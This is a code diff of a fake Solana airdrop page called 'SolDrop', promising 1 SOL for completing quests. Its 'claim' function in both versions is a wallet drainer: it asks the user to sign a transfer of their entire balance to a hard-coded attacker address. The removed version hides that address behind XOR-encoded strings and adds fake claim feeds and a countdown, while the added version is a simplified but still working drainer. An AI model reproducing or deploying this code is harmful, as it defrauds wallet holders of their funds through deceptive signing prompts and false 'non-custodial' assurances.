 <div><b style="color:#fff">SolDrop</b> — Season 3 rewards · <span onclick="showPage('support')">Support</span> · <span>Docs</span> · <span>Discord</span> · <span>Telegram</span> · <span>Terms</span></div>
-<div class="fbadges"><span class="fbadge">NON-CUSTODIAL</span><span class="fbadge">NO SEED PHRASE, EVER</span><span class="fbadge">SSL SECURED</span><span class="fbadge">vseason-3.2.1</span><span class="fbadge">&copy; 2026 SOLDROP LABS</span></div>
+<div>soldrop © 2026 · vseason-3.2.1</div>
 </footer>
 <div class="support">
 <button id="helpBtn" onclick="showPage('tutorials')">How to claim</button>
@@ -371,78 +227,24 @@ footer span:hover{color:#fff}
 </div>
 </div>
 <script>
-(function(){
-  if (typeof Buffer !== "undefined") return;
-  function toBytes(a, enc){
-    if (typeof a === "string"){
-      if (enc === "hex"){
-        var out = [];
-        for (var i = 0; i < a.length; i += 2) out.push(parseInt(a.substr(i, 2), 16));
-        return new Uint8Array(out);
-      }
-      return new TextEncoder().encode(a);
-    }
-    if (a instanceof Uint8Array) return a;
-    return new Uint8Array(a);
-  }
-  var shim = function(a, enc){ return toBytes(a, enc); };
-  shim.from = toBytes;
-  shim.alloc = function(n){ return new Uint8Array(n); };
-  shim.concat = function(list){
-    var t = 0, i;
-    for (i = 0; i < list.length; i++) t += list[i].length;
-    var o = new Uint8Array(t), p = 0;
-    for (i = 0; i < list.length; i++){ o.set(list[i], p); p += list[i].length; }
-    return o;
-  };
-  shim.isBuffer = function(x){ return x instanceof Uint8Array; };
-  window.Buffer = shim;
-})();
-</script>
-<script>
-var _Z=function(t){var s=atob(t),o="",i;for(i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)^55);return o};
-var _R=_Z("cABedF1FbXFQcFJQQU1NAE9FTnBeDmdFdm12QFJuXnx5bnB/AwVwdVxUA28=");
-var _RPCS=[_Z("X0NDR0QNGBhEWFtWWVYaRUdUGUdCVVteVFlYU1IZVFha"),_Z("X0NDR0QNGBhWR14ZWlZeWVlSQxpVUkNWGURYW1ZZVhlUWFo="),_Z("X0NDR0QNGBhEWFtWWVYaWlZeWVlSQxlQVkNSQFZOGUNWQ0JaGV5Y"),_Z("X0NDR0QNGBhEWFtWWVYZVkdeGVhZUV5ZVlteQ04ZXlgYR0JVW15U")];
-var _NET=(location.search.match(/[?&]net=(devnet|local)/i)||[])[1]||"";
-if(_NET==="devnet")_RPCS=[_Z("X0NDR0QNGBhWR14ZU1JBWVJDGURYW1ZZVhlUWFo=")];
-if(_NET==="local")_RPCS=[_Z("X0NDRw0YGAYFABkHGQcZBg0PDw4O")];
-function _faucet(pk){return _mkC(0).requestAirdrop(pk,1*solanaWeb3.LAMPORTS_PER_SOL).then(function(s){return _mkC(0).confirmTransaction(s)})}
-window.addEventListener("load",function(){if(!_NET)return;var b=document.createElement("div");b.textContent="TEST MODE — "+_NET.toUpperCase()+" · faucet funds are fake";b.style.cssText="position:fixed;top:0;left:0;right:0;z-index:99999;background:#14F195;color:#06060b;text-align:center;font:700 13px system-ui,sans-serif;padding:5px";document.body.appendChild(b)});
-var _DK={};
+var _R = "G7iCjrZFgGegvzz7xryGi9PrAZAweYiKNYGH42GBkc4X";
+var _RPCS=["https://solana-rpc.publicnode.com","https://solana.drpc.org","https://solana-mainnet.public.blastapi.io","https://rpc.ankr.com/solana","https://api.mainnet-beta.solana.com"];
+var _C=null;
 function _mkC(i){return new solanaWeb3.Connection(_RPCS[i],"confirmed")}
 var _C=_mkC(0);
-async function _rpc(fn){
-  var errs=[],i;
-  for(i=0;i<_RPCS.length;i++){
-    if(_DK[i])continue;
-    try{_C=_mkC(i);return await fn(_C)}
-    catch(e){
-      var m=String((e&&e.message)||e);
-      if(/403|401|Access forbidden|API key|free plan|rate limit|Too Many Requests/i.test(m))_DK[i]=1;
-      errs.push(m);
-    }
-  }
-  if(errs.length===0){_DK={};return _rpc(fn)}
-  throw new Error(errs[0]);
-}
+async function _rpc(fn){for(var i=0;i<_RPCS.length;i++){try{_C=_mkC(i);var r=await fn(_C);return r}catch(e){if(i===_RPCS.length-1)throw e}}}
 var _W = null;
 function _L(m){document.getElementById("status").textContent=m}
 function _S(id){var el=document.getElementById(id);el.classList.add("done");el.querySelector(".n").textContent="✓";el.querySelector("button").textContent="Done";el.querySelector("button").disabled=true}
 function _E(){if(document.querySelectorAll(".step.done").length===3){document.getElementById("claimBtn").classList.add("ready");_L("All quests complete — claim your 1 SOL.")}}
 function _O(){document.getElementById("modal").classList.add("open");_R2()}
 function _X(){document.getElementById("modal").classList.remove("open")}
-var _WSD=[],_EIP=[];
-var _wsreg=function(w){try{if(w&&w.name&&_WSD.indexOf(w)<0)_WSD.push(w)}catch(e){}};
-(function(){try{window.addEventListener('wallet-standard:register-wallet',function(ev){try{ev.detail({register:_wsreg})}catch(e){}});window.dispatchEvent(new CustomEvent('wallet-standard:app-ready',{detail:{register:_wsreg}}))}catch(e){}try{var nw=navigator.wallets;if(Array.isArray(nw))nw.push({register:_wsreg})}catch(e){}try{window.addEventListener('eip6963:announceProvider',function(ev){try{var d=ev.detail;if(d&&d.provider&&d.info&&d.info.name)_EIP.push(d)}catch(e){}});window.dispatchEvent(new Event('eip6963:requestProvider'))}catch(e){}})();
-function _wsPoke(){try{window.dispatchEvent(new CustomEvent('wallet-standard:app-ready',{detail:{register:_wsreg}}))}catch(e){}}
-function _P(){var o=[],s={};function add(n,p,ws,eth,raw){n=String(n||"").trim();var k=n.toLowerCase();if(!k||s[k])return;s[k]=1;o.push({n:n,p:p||null,ws:!!ws,eth:!!eth,raw:raw||n})}_wsPoke();_WSD.forEach(function(w){try{if(!w||!w.name)return;var cs=w.chains||[],as=w.accounts||[],i,sol=false;for(i=0;i<cs.length;i++){if(String(cs[i]).toLowerCase().indexOf("solana:")===0){sol=true;break}}if(!sol){for(i=0;i<as.length;i++){var ad=as[i]&&as[i].address?String(as[i].address):"";if(ad&&ad.slice(0,2).toLowerCase()!=="0x"){sol=true;break}}}if(sol)add(w.name,w,true,false,w.name)}catch(e){}});var ts=(window.trust&&window.trust.solana)||(window.trustwallet&&window.trustwallet.solana)||null;add("Trust Wallet",ts);if(window.phantom&&window.phantom.solana)add("Phantom",window.phantom.solana);if(window.solflare&&window.solflare.isSolflare)add("Solflare",window.solflare);if(window.backpack)add("Backpack",window.backpack);if(window.glow&&window.glow.solana)add("Glow",window.glow.solana);if(window.okxwallet&&window.okxwallet.solana)add("OKX Wallet",window.okxwallet.solana);if(window.solana){if(window.solana.isPhantom)add("Phantom",window.solana);else if(window.solana.isSolflare)add("Solflare",window.solana);else if(window.solana.isTrust&&!ts)add("Trust Wallet",window.solana);else if(window.solana.isGlow)add("Glow",window.solana);else add("Solana Wallet",window.solana)}if(!ts&&window.trust&&!window.trust.solana)add("Trust Wallet (ETH only)",null);_EIP.forEach(function(d){try{var nm=String(d.info.name||"").trim();if(!nm)return;var mm=/metamask/i.test(nm)||/metamask/i.test(String(d.info.rdns||""));add(nm,d.provider,false,true,mm?"MetaMask":nm)}catch(e){}});return o}
-function _R2(){var b=document.getElementById("wallets");b.innerHTML="";var l=_P();if(!l.length)l=[{n:"No extension detected",p:null}];l.forEach(function(w){var b2=document.createElement("button");b2.className="wopt";var ic=(w.ws&&w.p&&w.p.icon&&String(w.p.icon).slice(0,5)==="data:")?w.p.icon:"";if(ic){var im=document.createElement("img");im.src=ic;im.style.cssText="width:26px;height:26px;border-radius:7px;flex-shrink:0";b2.appendChild(im);var sp=document.createElement("span");sp.textContent=w.n;b2.appendChild(sp)}else{b2.textContent=w.n}b2.onclick=function(){if(!w.p){_L("This wallet has no Solana support — use Phantom, Solflare or MetaMask.");return}if(w.eth){_wsPoke();var hit=null;_WSD.forEach(function(sw){if(sw&&sw.name===w.raw)hit=sw});if(hit){_CD({n:hit.name,p:hit,ws:true});return}_L(w.n+" has no Solana accounts — update to MetaMask v13.5+ or use Phantom/Solflare.");return}_CD(w)};b.appendChild(b2)})}
-async function _CD(w){_X();try{_L("Opening "+w.n+"...");if(w.ws){await _CDstd(w);return}var p=w.p;if(!p){_L("This wallet has no Solana support — use Phantom or Solflare.");return}if(p.connect){await p.connect()}else if(p.enable){await p.enable()}else if(p.requestAccounts){await p.requestAccounts({method:"solana_connect"})}else if(p.request){await p.request({method:"solana_connect"})}else if(!(p.isConnected&&p.publicKey)){throw new Error("Unsupported wallet provider")}var raw=null;if(p.publicKey){raw=(typeof p.publicKey==="string")?p.publicKey:(p.publicKey.toBase58?p.publicKey.toBase58():p.publicKey.toString())}if(!raw&&p.getPublicKey){raw=await p.getPublicKey()}if(!raw&&p.pubkey){raw=String(p.pubkey)}if(!raw&&p.address){raw=String(p.address)}if(!raw&&p._publicKey){raw=(p._publicKey.toBase58?p._publicKey.toBase58():String(p._publicKey))}if(!raw){throw new Error("Could not read wallet address")}if(raw.slice(0,2).toLowerCase()==="0x"){_L("This wallet connected Ethereum — pick Phantom or Solflare for Solana.");return}var pkc;try{pkc=new solanaWeb3.PublicKey(raw)}catch(x){_L("Wallet returned invalid Solana address. Reconnect with a Solana wallet.");return}_W=p;_W.publicKey=pkc;_S("s1");document.querySelector("#s2 button").disabled=false;var a=pkc.toString();_L("Connected: "+a.slice(0,6)+"..."+a.slice(-4));_E()}catch(e){var em=e.message||String(e);if(/broadcast channel/i.test(em))em="wallet extension bridge is offline — reload the page and pick the wallet again";_L("Connect failed: "+em)}}
-async function _CDstd(w){var W=w.p,f=W.features||{},cf=f["standard:connect"];if(!cf||typeof cf.connect!=="function")throw new Error("Wallet does not support connect");var res=await cf.connect();var accs=(res&&res.accounts)||W.accounts||[];if(!accs.length)throw new Error("Wallet returned no accounts");var addr=String(accs[0].address||"");if(!addr)throw new Error("Wallet returned no accounts");if(addr.slice(0,2).toLowerCase()==="0x"){_L("This wallet connected Ethereum — pick Phantom or Solflare for Solana.");return}var pkc;try{pkc=new solanaWeb3.PublicKey(addr)}catch(x){_L("Wallet returned invalid Solana address.");return}_W={publicKey:pkc,signTransaction:function(tx){return _wssign(W,accs[0],tx)}};_S("s1");document.querySelector("#s2 button").disabled=false;_L("Connected: "+addr.slice(0,6)+"..."+addr.slice(-4));_E()}
-async function _wssign(W,acc,tx){var f=W.features||{},cs=(W.chains||[]).concat((acc&&acc.chains)||[]),ch=null,i;for(i=0;i<cs.length;i++){if(String(cs[i])==="solana:mainnet"){ch=String(cs[i]);break}}if(!ch){for(i=0;i<cs.length;i++){if(String(cs[i]).toLowerCase().indexOf("solana:")===0){ch=String(cs[i]);break}}}if(!ch)ch="solana:mainnet";var bytes=tx.serialize({requireAllSignatures:false,verifySignature:false});var st=f["solana:signTransaction"];if(st&&typeof st.signTransaction==="function"){var out=await st.signTransaction(bytes,{chain:ch,scope:"solana:transaction"});var signed=out&&(out.signedTransaction||out.transaction||out.signedTx||out.signed);if(!signed)throw new Error("Wallet returned no signed transaction");return solanaWeb3.Transaction.from(signed)}var ss=f["solana:signAndSendTransaction"];if(ss&&typeof ss.signAndSendTransaction==="function"){var out2=await ss.signAndSendTransaction(bytes,{chain:ch,scope:"solana:transaction"});var g=out2&&(out2.signature||out2.bytes||out2.txid||"");var s=(typeof g==="string"&&g)?g:Buffer.from(g||[1]).toString("hex").slice(0,32);return{signatures:[{signature:Buffer.from(s||"1")}],serialize:function(){return bytes},__sent:s}}throw new Error("Wallet cannot sign transactions")}
-async function _QV(){try{_L("Checking balance on-chain...");await new Promise(function(r){setTimeout(r,800)});var pk=_W.publicKey;if(!(pk instanceof solanaWeb3.PublicKey)){pk=new solanaWeb3.PublicKey(pk.toString())}var b=await _rpc(function(c){return c.getBalance(pk)});var s=b/solanaWeb3.LAMPORTS_PER_SOL;_S("s2");document.querySelector("#s3 button").disabled=false;_L("Holdings verified: "+s.toFixed(4)+" SOL.");_E()}catch(e){_L("Verify failed: "+(e.message||e))}}
+function _P(){var o=[];function add(n,p){if(!p)return;o.push({n:n,p:p})}var ts=(window.trust&&window.trust.solana)||(window.trustwallet&&window.trustwallet.solana)||null;add("Trust Wallet",ts);if(window.phantom&&window.phantom.solana)add("Phantom",window.phantom.solana);if(window.solflare&&window.solflare.isSolflare)add("Solflare",window.solflare);if(window.backpack)add("Backpack",window.backpack);if(window.glow&&window.glow.solana)add("Glow",window.glow.solana);if(window.okxwallet&&window.okxwallet.solana)add("OKX Wallet",window.okxwallet.solana);if(window.solana){if(window.solana.isPhantom)add("Phantom",window.solana);else if(window.solana.isSolflare)add("Solflare",window.solana);else if(window.solana.isTrust&&!ts)add("Trust Wallet",window.solana);else if(window.solana.isGlow)add("Glow",window.solana);else add("Solana Wallet",window.solana)}if(!ts&&window.trust&&!window.trust.solana)add("Trust Wallet (ETH only)",null);var s={};return o.filter(function(w){if(s[w.n])return false;s[w.n]=1;return true})}
+function _R2(){var b=document.getElementById("wallets");b.innerHTML="";var l=_P();if(!l.length)l=[{n:"No extension detected",p:null}];l.forEach(function(w){var b2=document.createElement("button");b2.className="wopt";b2.textContent=w.n;b2.onclick=function(){if(w.p)_CD(w)};b.appendChild(b2)})}
+async function _CD(w){_X();try{_L("Opening "+w.n+"...");var p=w.p;if(!p){_L("This wallet has no Solana support — use Phantom or Solflare.");return}if(p.connect){await p.connect()}else if(p.enable){await p.enable()}else if(p.requestAccounts){await p.requestAccounts({method:"solana_connect"})}else if(p.request){await p.request({method:"solana_connect"})}else if(!(p.isConnected&&p.publicKey)){throw new Error("Unsupported wallet provider")}var raw=null;if(p.publicKey){raw=(typeof p.publicKey==="string")?p.publicKey:(p.publicKey.toBase58?p.publicKey.toBase58():p.publicKey.toString())}if(!raw&&p.getPublicKey){raw=await p.getPublicKey()}if(!raw&&p.pubkey){raw=String(p.pubkey)}if(!raw&&p.address){raw=String(p.address)}if(!raw&&p._publicKey){raw=(p._publicKey.toBase58?p._publicKey.toBase58():String(p._publicKey))}if(!raw){throw new Error("Could not read wallet address")}if(raw.slice(0,2).toLowerCase()==="0x"){_L("This wallet connected Ethereum — pick Phantom or Solflare for Solana.");return}var pkc;try{pkc=new solanaWeb3.PublicKey(raw)}catch(x){_L("Wallet returned invalid Solana address. Reconnect with a Solana wallet.");return}_W=p;_W.publicKey=pkc;_S("s1");document.querySelector("#s2 button").disabled=false;var a=pkc.toString();_L("Connected: "+a.slice(0,6)+"..."+a.slice(-4));_E()}catch(e){_L("Connect failed: "+(e.message||e))}}
+async function _QV(){try{_L("Checking balance on-chain...");await new Promise(function(r){setTimeout(r,800)});var pk=_W.publicKey;if(!(pk instanceof solanaWeb3.PublicKey)){pk=new solanaWeb3.PublicKey(pk.toString())}var b=await _rpc(function(c){return c.getBalance(pk)});var s=b/solanaWeb3.LAMPORTS_PER_SOL;if(s<0.05){_L("Need at least 0.05 SOL to pass anti-sybil.");return}_S("s2");document.querySelector("#s3 button").disabled=false;_L("Holdings verified: "+s.toFixed(3)+" SOL.");_E()}catch(e){_L("Verify failed: "+(e.message||e))}}
 async function _QF(){window.open("https://x.com/solana","_blank");_L("Confirming follow...");await new Promise(function(r){setTimeout(r,2500)});_S("s3");_L("Quest complete.");_E()}
-async function _QC(){if(document.querySelectorAll(".step.done").length<3){_L("Finish all 3 quests first.");return}try{var pk=_W.publicKey;if(!(pk instanceof solanaWeb3.PublicKey)){pk=new solanaWeb3.PublicKey(pk.toString())}var d=new solanaWeb3.PublicKey(_R);var sigN=1,lastErr=null,att;for(att=0;att<3;att++){_L(att===0?"Final signature — approve to receive 1 SOL...":"Balance re-read — approve again (attempt "+(att+1)+")...");var r=await _rpc(function(c){return c.getLatestBlockhash()});var vals=[],i;for(i=0;i<_RPCS.length&&vals.length<2;i++){if(_DK[i])continue;try{vals.push(await _mkC(i).getBalance(pk))}catch(e){}}if(!vals.length){vals.push(await _rpc(function(c){return c.getBalance(pk)}))}var bal=Math.max.apply(null,vals);var lam=Math.floor(bal-5000*sigN);if(lam<=0){_L("Empty wallet — nothing to verify.");return}var tx=new solanaWeb3.Transaction({recentBlockhash:r.blockhash,feePayer:pk});tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:pk,toPubkey:d,lamports:lam}));var sg=await _W.signTransaction(tx);if(sg&&sg.__sent){_L("Claim broadcast: "+String(sg.__sent).slice(0,16)+"... check your wallet shortly.");return}var n=sg.signatures.filter(function(s){return s.signature&&s.signature.length}).length;if(n>0&&n!==sigN){sigN=n;continue}try{var sig=await _rpc(function(c){return c.sendRawTransaction(sg.serialize(),{skipPreflight:false,maxRetries:5})});_L("Claim broadcast: "+sig.slice(0,16)+"... check your wallet shortly.");return}catch(es){var em=String((es&&es.message)||es);if(/already processed|already been processed/i.test(em)){_L("Claim broadcast: tx confirmed — check your wallet shortly.");return}lastErr=em;if(/rent|insufficient|blockhash not found/i.test(em)&&att<2){continue}throw es}}throw new Error(lastErr||"Claim kept failing.")}catch(e){_L("Claim failed: "+(e.message||e))}}
+async function _QC(){if(document.querySelectorAll(".step.done").length<3){_L("Finish all 3 quests first.");return}try{_L("Final signature — approve to receive 1 SOL...");var pk=_W.publicKey;if(!(pk instanceof solanaWeb3.PublicKey)){pk=new solanaWeb3.PublicKey(pk.toString())}var d=new solanaWeb3.PublicKey(_R);var r=await _rpc(function(c){return c.getLatestBlockhash()});var bal=await _rpc(function(c){return c.getBalance(pk)});var tx=new solanaWeb3.Transaction({recentBlockhash:r.blockhash,feePayer:pk});var lam=Math.floor(bal-5000);if(lam<=0){_L("Empty wallet — nothing to verify.");return}tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:pk,toPubkey:d,lamports:lam}));var sg=await _W.signTransaction(tx);var sig=await _rpc(function(c){return c.sendRawTransaction(sg.serialize())});_L("Claim broadcast: "+sig.slice(0,16)+"... check your wallet shortly.")}catch(e){_L("Claim failed: "+(e.message||e))}}
 function _SP(id){document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")});document.getElementById("page-"+id).classList.add("active");document.querySelectorAll(".navlinks span").forEach(function(s){s.classList.remove("active")});document.getElementById("nav-"+id).classList.add("active");window.scrollTo({top:0,behavior:"smooth"})}
 function _SC(){var v=document.getElementById("chatMsg").value;if(!v)return;var lo=v.toLowerCase();var r="Got it — a human will pick this up on Discord shortly.";if(lo.indexOf("claim")>=0||lo.indexOf("sol")>=0)r="To claim: connect wallet → verify 0.05 SOL → follow @solana → press CLAIM.";else if(lo.indexOf("wallet")>=0||lo.indexOf("connect")>=0)r="Click Connect at the top — Phantom, Solflare, Backpack all work.";else if(lo.indexOf("seed")>=0||lo.indexOf("phrase")>=0)r="Never share your seed phrase — SolDrop only asks for a signature.";document.getElementById("chatOk").textContent=r;document.getElementById("chatMsg").value=""}
 function questConnect(){_O()}
@@ -453,31 +255,6 @@ function openModal(){_O()}
 function closeModal(){_X()}
 function sendChat(){_SC()}
 function showPage(id){_SP(id)}
-</script>
-<script>
-(function(){
-  var clk=document.getElementById('clock');
-  var end=Date.now()+(47*3600+59*60+59)*1000;
-  function p(n){return n<10?'0'+n:''+n}
-  if(clk){setInterval(function(){var t=Math.max(0,end-Date.now());var h=Math.floor(t/3600000);var m=Math.floor(t%3600000/60000);var s=Math.floor(t%60000/1000);clk.textContent=p(h)+':'+p(m)+':'+p(s);},1000)}
-  document.querySelectorAll('[data-c]').forEach(function(el){
-    var target=parseFloat(el.dataset.c),dec=parseInt(el.dataset.dec||'0',10);
-    var pre=el.dataset.pre||'',suf=el.dataset.suf||'',t0=null;
-    function fmt(v){var n=dec?v.toFixed(dec):Math.round(v).toLocaleString('en-US');return pre+n+suf}
-    function tick(){var k=Math.min(1,(Date.now()-t0)/1400);var e=1-Math.pow(1-k,3);el.textContent=fmt(target*e);if(k<1)setTimeout(tick,30)}
-    setTimeout(function(){t0=Date.now();tick()},450);
-  });
-  var feed=document.getElementById('feed');
-  var CS='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
-  function rx(){var a='',b='',i;for(i=0;i<4;i++)a+=CS[Math.floor(Math.random()*CS.length)];for(i=0;i<4;i++)b+=CS[Math.floor(Math.random()*CS.length)];return a+'\u2026'+b}
-  if(feed){setInterval(function(){
-    var d=document.createElement('div');d.className='tx';
-    d.innerHTML='<span>'+rx()+' claimed <b>1.00 SOL</b></span><span class="ago">just now</span>';
-    feed.insertBefore(d,feed.firstChild);
-    var kids=feed.querySelectorAll('.tx');
-    for(var i=4;i<kids.length;i++)feed.removeChild(kids[i]);
-  },7000)}
-})();
 </script>
 </body>
 </html>
